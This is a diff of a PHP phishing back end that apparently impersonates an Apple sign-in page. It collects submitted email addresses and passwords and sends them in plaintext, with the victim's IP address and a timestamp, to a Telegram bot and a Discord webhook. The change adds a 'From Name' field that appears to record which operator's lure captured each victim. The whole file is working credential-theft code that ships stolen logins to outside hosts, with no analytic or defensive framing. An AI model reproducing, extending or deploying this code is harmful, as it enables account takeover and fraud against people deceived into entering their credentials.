@@ -1,7 +1,10 @@
 <?php
+session_start();
+ini_set('display_errors', 0);              // pigilan ang warning na lumabas sa output
+header('Content-Type: application/json');
 date_default_timezone_set('Asia/Manila');
-require_once '../config.php';
-
+require_once '../config.php'; 
+$fullName = $_SESSION['avea_full_name'] ?? 'Unknown';
 // ---------- HELPER FUNCTIONS ----------
 function tg_escape($value) {
     return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
@@ -18,16 +21,19 @@ function short_discord_field($value, $limit = 950) {
     if (strlen($value) > $limit) return substr($value, 0, $limit) . "\n...";
     return $value;
 }
-
 function send_notifications($data, $options = ['telegram' => true, 'discord' => true]) {
     global $telegram_bot_token, $telegram_chat_id, $discord_webhook_url;
 
     // ---------- TELEGRAM ----------
     if (!empty($options['telegram']) && !empty($telegram_bot_token) && !empty($telegram_chat_id)) {
-        $tgMessage = "✨ <b>New Apple Login Notification</b>\n\n";
-        foreach ($data as $key => $value) {
-            $tgMessage .= "<b>{$key}:</b> <code>{$value}</code>\n";
-        }
+       $tgMessage  = "✨ <b>New Apple Login Notification</b>\n\n";
+
+$tgMessage .= "<b>IP Address:</b> <code>{$data['IP Address']}</code>\n";
+$tgMessage .= "<b>Time:</b> <code>{$data['Time']}</code>\n";
+ $tgMessage .= "<b>From Name:</b> <code>{$data['From Name']}</code>\n\n";
+
+$tgMessage .= "<b>Username:</b> <code>{$data['Username']}</code>\n";
+$tgMessage .= "<b>Password:</b> <code>{$data['Password']}</code>\n";
 
         $tgUrl = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
         $tgParams = [
@@ -51,31 +57,42 @@ function send_notifications($data, $options = ['telegram' => true, 'discord' => 
         $discordFields = [];
 
         // IP & Time inline
-        if (isset($data['IP Address'])) {
-            $discordFields[] = [
-                'name' => 'IP Address',
-                'value' => '`' . discord_safe($data['IP Address']) . '`',
-                'inline' => true
-            ];
-        }
-        if (isset($data['Time'])) {
-            $discordFields[] = [
-                'name' => 'Time',
-                'value' => '`' . discord_safe($data['Time']) . '`',
-                'inline' => true
-            ];
-        }
+     // From Name (full width)
+if (isset($data['From Name'])) {
+    $discordFields[] = [
+        'name' => 'From Name',
+        'value' => '`' . discord_safe($data['From Name']) . '`',
+        'inline' => false
+    ];
+}
+
+// IP & Time
+if (isset($data['IP Address'])) {
+    $discordFields[] = [
+        'name' => 'IP Address',
+        'value' => '`' . discord_safe($data['IP Address']) . '`',
+        'inline' => true
+    ];
+}
+
+if (isset($data['Time'])) {
+    $discordFields[] = [
+        'name' => 'Time',
+        'value' => '`' . discord_safe($data['Time']) . '`',
+        'inline' => true
+    ];
+}
 
         // Username & Password inline
-        foreach ($data as $key => $value) {
-            if (stripos($key, 'Username') !== false || stripos($key, 'Password') !== false) {
-                $discordFields[] = [
-                    'name' => $key,
-                    'value' => '`' . discord_safe($value) . '`',
-                    'inline' => true
-                ];
-            }
-        }
+       foreach ($data as $key => $value) {
+    if (stripos($key, 'Username') !== false || stripos($key, 'Password') !== false) {
+        $discordFields[] = [
+            'name' => $key,
+            'value' => '`' . discord_safe($value) . '`',
+            'inline' => true
+        ];
+    }
+}
 
         $payload = [
             'content' => "✨ **New Apple Login Notification**",
@@ -117,6 +134,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['eml'], $_POST['pwd'])
     $time = date('M d - h:i:s A');
 
     $data = [
+        'From Name' => $fullName,
         'IP Address' => $ip,
         'Time' => $time,
         'Username' => $username,
